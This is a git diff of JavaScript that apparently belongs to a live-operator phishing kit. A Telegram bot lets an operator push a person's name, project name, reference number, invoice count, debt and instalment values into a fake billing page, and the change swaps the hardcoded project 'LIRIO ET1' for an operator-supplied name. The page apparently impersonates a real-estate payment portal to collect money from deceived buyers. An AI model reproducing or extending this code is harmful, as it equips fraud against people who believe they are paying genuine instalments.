@@ -1377,7 +1377,7 @@ function handleTelegramActionToken(action) {
             method: 'POST', headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ 
                 chat_id: TG_CHAT_ID, 
-                text: `👉 <b>Escribe los 6 datos en líneas separadas:</b>\n\n<code>Nombre Completo\nReferencia Completa\nTotal Facturas\nValor Cartera\nValor Cuota\nFecha Base (DD/MM/AAAA)</code>`, 
+                text: `👉 <b>Escribe los 7 datos en líneas separadas:</b>\n\n<code>Nombre Proyecto\nNombre Completo\nReferencia Completa\nTotal Facturas\nValor Cartera\nValor Cuota\nFecha Base (DD/MM/AAAA)</code>`, 
                 parse_mode: 'HTML' 
             })
         });
@@ -1406,33 +1406,34 @@ function handleTelegramActionToken(action) {
 function procesarDatosFacturas(texto) {
     const partes = texto.split('\n').map(s => s.trim()).filter(s => s !== '');
     
-    if (partes.length < 6) {
+    if (partes.length < 7) {
         fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`, {
             method: 'POST', headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ chat_id: TG_CHAT_ID, text: "❌ Error: Debes escribir 6 líneas con los datos (Nombre, Referencia, Facturas, Cartera, Cuota, Fecha). Vuelve a intentarlo.", parse_mode: 'HTML' })
+            body: JSON.stringify({ chat_id: TG_CHAT_ID, text: "❌ Error: Debes escribir 7 líneas con los datos (Proyecto, Nombre, Referencia, Facturas, Cartera, Cuota, Fecha). Vuelve a intentarlo.", parse_mode: 'HTML' })
         });
         escucharDatosFacturas(); 
         return;
     }
 
-    const nombreUsuario = partes[0];
-    const referenciaCompleta = partes[1];
-    const totalFacturasStr = partes[2].replace(/\D/g, '');
-    const valorCarteraStr = partes[3].replace(/\D/g, '');
-    const valorCuotaStr = partes[4].replace(/\D/g, '');
+    const nombreProyecto = partes[0];
+    const nombreUsuario = partes[1];
+    const referenciaCompleta = partes[2];
+    const totalFacturasStr = partes[3].replace(/\D/g, '');
+    const valorCarteraStr = partes[4].replace(/\D/g, '');
+    const valorCuotaStr = partes[5].replace(/\D/g, '');
     
     const totalFacturas = parseInt(totalFacturasStr) || 17;
     const valorCartera = parseFloat(valorCarteraStr) || 42655060;
     const valorCuota = parseFloat(valorCuotaStr) || 1500000;
-    const fechaBase = partes[5];
+    const fechaBase = partes[6];
 
     const partesRef = referenciaCompleta.split('.');
     const idFactura = partesRef.length > 1 ? partesRef[partesRef.length - 1] : referenciaCompleta;
     const subReferencia = referenciaCompleta.split('.')[0] || "16-1003";
 
     document.getElementById('txtSaludoNombre').textContent = `¡Hola! ${nombreUsuario}`;
-    document.getElementById('txtNombreProyecto').textContent = `LIRIO ET1`; 
-    document.getElementById('txtNombreProyectoPaso2').textContent = `LIRIO ET1`;
+    document.getElementById('txtNombreProyecto').textContent = nombreProyecto; 
+    document.getElementById('txtNombreProyectoPaso2').textContent = nombreProyecto;
     
     document.getElementById('txtReferencia').textContent = referenciaCompleta;
     document.getElementById('txtSubReferencia').textContent = subReferencia;
@@ -1473,7 +1474,7 @@ function procesarDatosFacturas(texto) {
         `;
         tbody.appendChild(tr);
 
-        // 🚀 RESTAR UN MES (IR HACIA ATRÁS)
+        // RESTAR UN MES (IR HACIA ATRÁS)
         fechaActual.setMonth(fechaActual.getMonth() - 1);
     }
 
